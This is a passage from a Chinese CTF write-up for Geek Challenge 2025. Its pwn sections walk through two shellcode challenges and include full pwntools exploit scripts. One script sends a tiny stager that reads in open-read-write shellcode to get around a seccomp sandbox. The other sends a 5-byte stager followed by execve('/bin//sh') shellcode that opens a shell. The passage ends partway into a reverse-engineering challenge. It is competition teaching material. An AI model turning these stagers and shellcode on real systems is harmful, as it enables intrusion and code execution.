<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kr">__int64</span> <span class="nf">Sandbox</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="kr">__int64</span> <span class="n">v1</span><span class="p">;</span> <span class="c1">// [rsp+8h] [rbp-8h]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl">  <span class="n">v1</span> <span class="o">=</span> <span class="nf">seccomp_init</span><span class="p">(</span><span class="mi">0LL</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span> <span class="o">!</span><span class="n">v1</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">  <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nf">perror</span><span class="p">(</span><span class="s">&#34;seccomp_init failed&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="nf">seccomp_rule_add</span><span class="p">(</span><span class="n">v1</span><span class="p">,</span> <span class="mi">2147418112LL</span><span class="p">,</span> <span class="mi">0LL</span><span class="p">,</span> <span class="mi">0LL</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="nf">seccomp_rule_add</span><span class="p">(</span><span class="n">v1</span><span class="p">,</span> <span class="mi">2147418112LL</span><span class="p">,</span> <span class="mi">2LL</span><span class="p">,</span> <span class="mi">0LL</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="nf">seccomp_rule_add</span><span class="p">(</span><span class="n">v1</span><span class="p">,</span> <span class="mi">2147418112LL</span><span class="p">,</span> <span class="mi">1LL</span><span class="p">,</span> <span class="mi">0LL</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="nf">seccomp_rule_add</span><span class="p">(</span><span class="n">v1</span><span class="p">,</span> <span class="mi">2147418112LL</span><span class="p">,</span> <span class="mi">60LL</span><span class="p">,</span> <span class="mi">0LL</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">int</span><span class="p">)</span><span class="nf">seccomp_load</span><span class="p">(</span><span class="n">v1</span><span class="p">)</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">  <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nf">perror</span><span class="p">(</span><span class="s">&#34;seccomp_load failed&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">seccomp_release</span><span class="p">(</span><span class="n">v1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="nf">seccomp_release</span><span class="p">(</span><span class="n">v1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>开了沙箱，没办法直接sh，只能orw，但是mmap了一块rwx区域，在0x405000，大小0x4000，并读入6个字节，最后会执行读入的指令，也就是说我们需要在六个字节里实现扩展写并写入完整的shellcode.
在call r8的地方下断点，查看栈和寄存器
<img src="/p/geek-challenge-2025-wp/image-5.png"
	width="1567"
	height="250"
	srcset="/p/geek-challenge-2025-wp/image-5_hu_4d248735bd12daa.png 480w, /p/geek-challenge-2025-wp/image-5_hu_66675710aad11006.png 1024w"
	loading="lazy"
	
		alt="alt text"
	
	
		class="gallery-image" 
		data-flex-grow="626"
		data-flex-basis="1504px"
	
>
<img src="/p/geek-challenge-2025-wp/image-6.png"
	width="793"
	height="728"
	srcset="/p/geek-challenge-2025-wp/image-6_hu_656a8b54d065931f.png 480w, /p/geek-challenge-2025-wp/image-6_hu_44d8a27f5be68dc.png 1024w"
	loading="lazy"
	
		alt="alt text"
	
	
		class="gallery-image" 
		data-flex-grow="108"
		data-flex-basis="261px"
	
>
此处需要设置扩展写需要syscall一次read,设置参数rax为0，rdi为0,rsi到刚刚mmap的rwx区域,rdx为一个很大的数,大到足够写下orw的shellcode，但是这里其实随便放进去个数就行，都够用，
但是通过mov等指令长度明显太大了，所以得使用pop用栈上的数据，但最后只有一个字节设置rax为0
此处的考点就是xchg，当xchg eax寄存器和其他寄存器时，对应的指令只有一个字节
所以可以写出shellcode</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">\x5A\x59\x5E\x93\x0F\x05
</span></span></code></pre></td></tr></table>
</div>
</div><p>四个字节用于设置寄存器，两个字节syscall刚好足够</p>
<h4 id="exp-6">exp
</h4><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl"><span class="c1"># context.log_level=&#39;debug&#39;</span>
</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">arch</span><span class="o">=</span><span class="s1">&#39;amd64&#39;</span>
</span></span><span class="line"><span class="cl"><span class="c1"># io=process(&#39;./pwn&#39;)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">=</span><span class="n">remote</span><span class="p">(</span><span class="s1">&#39;geek.ctfplus.cn&#39;</span><span class="p">,</span><span class="mi">32321</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># gdb.attach(io)</span>
</span></span><span class="line"><span class="cl"><span class="n">shellcode</span><span class="o">=</span><span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x5A\x59\x5E\x93\x0F\x05</span><span class="s2">&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">shellcode2</span><span class="o">=</span><span class="sa">b</span><span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="mi">6</span><span class="o">+</span><span class="n">asm</span><span class="p">(</span><span class="n">shellcraft</span><span class="o">.</span><span class="n">open</span><span class="p">(</span><span class="s1">&#39;./flag&#39;</span><span class="p">)</span><span class="o">+</span><span class="n">shellcraft</span><span class="o">.</span><span class="n">read</span><span class="p">(</span><span class="mi">3</span><span class="p">,</span><span class="mh">0x406000</span><span class="p">,</span><span class="mh">0x100</span><span class="p">)</span><span class="o">+</span><span class="n">shellcraft</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mh">0x406000</span><span class="p">,</span><span class="mh">0x100</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="c1"># gdb.attach(io)</span>
</span></span><span class="line"><span class="cl"><span class="c1"># pause()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">shellcode</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">shellcode2</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="血池轮回">血池轮回
</h3><h4 id="解题流程-7">解题流程
</h4><p>查保护
<img src="/p/geek-challenge-2025-wp/image-7.png"
	width="448"
	height="226"
	srcset="/p/geek-challenge-2025-wp/image-7_hu_8ebac8d00ddf8268.png 480w, /p/geek-challenge-2025-wp/image-7_hu_5a682e8aaa18dba2.png 1024w"
	loading="lazy"
	
		alt="alt text"
	
	
		class="gallery-image" 
		data-flex-grow="198"
		data-flex-basis="475px"
	
>
查伪代码</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">int</span> <span class="kr">__fastcall</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="n">envp</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="nf">init</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">  <span class="nf">loop</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kr">__int64</span> <span class="kr">__fastcall</span> <span class="nf">loop</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="kr">__int64</span> <span class="n">v0</span><span class="p">;</span> <span class="c1">// rbx
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">int</span> <span class="n">i</span><span class="p">;</span> <span class="c1">// [rsp+4h] [rbp-1Ch]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kr">__int64</span> <span class="n">v3</span><span class="p">;</span> <span class="c1">// [rsp+8h] [rbp-18h]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl">  <span class="nf">make_code_executable</span><span class="p">((</span><span class="kt">unsigned</span> <span class="kr">__int64</span><span class="p">)</span><span class="o">&amp;</span><span class="n">code</span><span class="p">,</span> <span class="mi">32LL</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="k">for</span> <span class="p">(</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;=</span> <span class="mi">99</span><span class="p">;</span> <span class="o">++</span><span class="n">i</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">  <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span> <span class="n">idx</span> <span class="o">&gt;</span> <span class="mi">9</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;Your blood is completely soaked in the pool of blood&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">      <span class="k">return</span> <span class="mi">0LL</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;this is already %d days loop,do you want to give up ? &#34;</span><span class="p">,</span> <span class="n">idx</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span> <span class="p">(</span><span class="kt">int</span><span class="p">)</span><span class="nf">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">code</span><span class="p">,</span> <span class="mi">1uLL</span><span class="p">)</span> <span class="o">&lt;=</span> <span class="mi">0</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">      <span class="k">break</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">v3</span> <span class="o">=</span> <span class="n">code</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span> <span class="n">code</span> <span class="o">==</span> <span class="mi">121LL</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;wise choice, but no encouragement&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">      <span class="k">return</span> <span class="n">v3</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="o">++</span><span class="n">idx</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Blood Pool Reincarnation Start !&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">unk_4040A1</span><span class="p">,</span> <span class="mi">5uLL</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">v3</span> <span class="o">=</span> <span class="n">v0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">((</span><span class="kt">void</span> <span class="p">(</span><span class="kr">__fastcall</span> <span class="o">*</span><span class="p">)(</span><span class="kr">__int64</span><span class="p">,</span> <span class="n">_QWORD</span><span class="p">,</span> <span class="n">_QWORD</span><span class="p">))(</span><span class="o">&amp;</span><span class="n">code</span> <span class="o">+</span> <span class="mi">1</span><span class="p">))(</span><span class="mi">1LL</span><span class="p">,</span> <span class="mi">0LL</span><span class="p">,</span> <span class="mi">0LL</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="n">v3</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">init</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="nf">setbuf</span><span class="p">(</span><span class="n">stdin</span><span class="p">,</span> <span class="mi">0LL</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="nf">setbuf</span><span class="p">(</span><span class="n">_bss_start</span><span class="p">,</span> <span class="mi">0LL</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="nf">setbuf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="mi">0LL</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>看一眼loop里，和上一个ember差不多，也是扩展写，但完整的shellcode长度也有限
<img src="/p/geek-challenge-2025-wp/image-8.png"
	width="682"
	height="790"
	srcset="/p/geek-challenge-2025-wp/image-8_hu_6fd6c27d73af6328.png 480w, /p/geek-challenge-2025-wp/image-8_hu_5271f7fdff612f3c.png 1024w"
	loading="lazy"
	
		alt="alt text"
	
	
		class="gallery-image" 
		data-flex-grow="86"
		data-flex-basis="207px"
	
>
所以直接五字节扩展写+短shellcode
<img src="/p/geek-challenge-2025-wp/image-9.png"
	width="1695"
	height="291"
	srcset="/p/geek-challenge-2025-wp/image-9_hu_51bd60ebd5f9dba8.png 480w, /p/geek-challenge-2025-wp/image-9_hu_de4a2cd13017a5fb.png 1024w"
	loading="lazy"
	
		alt="alt text"
	
	
		class="gallery-image" 
		data-flex-grow="582"
		data-flex-basis="1397px"
	
>
在call rcx处断点，查看栈，仍然可以利用栈上的数据设置寄存器
所以得到shellcode</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">\x96\x5a\x5f\x0f\x05
</span></span></code></pre></td></tr></table>
</div>
</div><p>然后扩展写，因为总空间有限，直接用shellcraft写的shellcode会太长，所以直接掏出22字节超短shellcode</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">\x48\x31\xF6\x56\x48\xBF\x2F\x62\x69\x6E\x2F\x2F\x73\x68\x57\x54\x5F\xB0\x3B\x99\x0F\x05
</span></span></code></pre></td></tr></table>
</div>
</div><p>甚至还剩一点空间</p>
<h4 id="exp-7">exp
</h4><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl"><span class="c1"># context(arch=&#39;amd64&#39;,os=&#39;linux&#39;,log_level=&#39;debug&#39;)</span>
</span></span><span class="line"><span class="cl"><span class="c1"># io = process(&#39;./pwn&#39;)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;geek.ctfplus.cn&#39;</span><span class="p">,</span><span class="mi">31973</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">line</span> <span class="o">=</span> <span class="n">io</span><span class="o">.</span><span class="n">recvline</span><span class="p">(</span><span class="n">timeout</span> <span class="o">=</span> <span class="mi">1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">line</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">recvline</span><span class="p">(</span><span class="n">timeout</span> <span class="o">=</span> <span class="mi">2</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">sh_shellcode</span> <span class="o">=</span> <span class="n">cyclic</span><span class="p">(</span><span class="mh">0x05</span><span class="p">)</span> <span class="o">+</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x48\x31\xF6\x56\x48\xBF\x2F\x62\x69\x6E\x2F\x2F\x73\x68\x57\x54\x5F\xB0\x3B\x99\x0F\x05</span><span class="s1">&#39;</span>
</span></span><span class="line"><span class="cl"><span class="n">ex_shellcode</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x96\x5a\x5f\x0f\x05</span><span class="s1">&#39;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># gdb.attach(io)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">ex_shellcode</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">sh_shellcode</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="re">RE
</h2><h3 id="encode">encode
</h3><h4 id="解题流程-8">解题流程
</h4><p>打开ida查看伪代码</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">int</span> <span class="kr">__fastcall</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="n">envp</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="kt">int</span> <span class="n">i</span><span class="p">;</span> <span class="c1">// [xsp+0h] [xbp-220h]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">char</span> <span class="n">v5</span><span class="p">[</span><span class="mi">256</span><span class="p">];</span> <span class="c1">// [xsp+8h] [xbp-218h] BYREF
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">char</span> <span class="n">v6</span><span class="p">[</span><span class="mi">256</span><span class="p">];</span> <span class="c1">// [xsp+108h] [xbp-118h] BYREF
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl">  <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;please input: &#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="nf">scanf</span><span class="p">(</span><span class="n">v6</span><span class="p">,</span> <span class="mi">256LL</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="k">for</span> <span class="p">(</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">encrypted_len</span><span class="p">;</span> <span class="o">++</span><span class="n">i</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">v5</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">v6</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">^</span> <span class="mh">0x5A</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="nf">compare</span><span class="p">(</span><span class="n">v5</span><span class="p">,</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">int</span><span class="p">)</span><span class="n">encrypted_len</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span><span class="lnt">54
</span><span class="lnt">55
</span><span class="lnt">56
</span><span class="lnt">57
</span><span class="lnt">58
</span><span class="lnt">59
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">scanf</span><span class="p">(</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">a1</span><span class="p">,</span> <span class="p">...)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="kt">int</span> <span class="n">v1</span><span class="p">;</span> <span class="c1">// w1
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kr">__int64</span> <span class="n">v2</span><span class="p">;</span> <span class="c1">// x10
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">bool</span> <span class="n">v4</span><span class="p">;</span> <span class="c1">// [xsp+10h] [xbp-140h]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">bool</span> <span class="n">v5</span><span class="p">;</span> <span class="c1">// [xsp+14h] [xbp-13Ch]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">int</span> <span class="n">i</span><span class="p">;</span> <span class="c1">// [xsp+18h] [xbp-138h]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">int</span> <span class="n">v7</span><span class="p">;</span> <span class="c1">// [xsp+1Ch] [xbp-134h]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">int</span> <span class="n">v8</span><span class="p">;</span> <span class="c1">// [xsp+20h] [xbp-130h]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">int</span> <span class="n">v9</span><span class="p">;</span> <span class="c1">// [xsp+24h] [xbp-12Ch]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="n">_BYTE</span> <span class="n">v12</span><span class="p">[</span><span class="mi">256</span><span class="p">];</span> <span class="c1">// [xsp+38h] [xbp-118h] BYREF
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl">  <span class="n">v9</span> <span class="o">=</span> <span class="n">v1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="n">v7</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="k">do</span>
</span></span><span class="line"><span class="cl">    <span class="n">v8</span> <span class="o">=</span> <span class="nf">getchar</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">  <span class="k">while</span> <span class="p">(</span> <span class="n">v8</span> <span class="o">!=</span> <span class="o">-</span><span class="mi">1</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="n">v8</span> <span class="o">==</span> <span class="mi">32</span> <span class="o">||</span> <span class="n">v8</span> <span class="o">==</span> <span class="mi">9</span> <span class="o">||</span> <span class="n">v8</span> <span class="o">==</span> <span class="mi">10</span> <span class="o">||</span> <span class="n">v8</span> <span class="o">==</span> <span class="mi">13</span><span class="p">)</span> <span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span> <span class="n">v8</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="k">while</span> <span class="p">(</span> <span class="mi">1</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">  <span class="p">{</span>
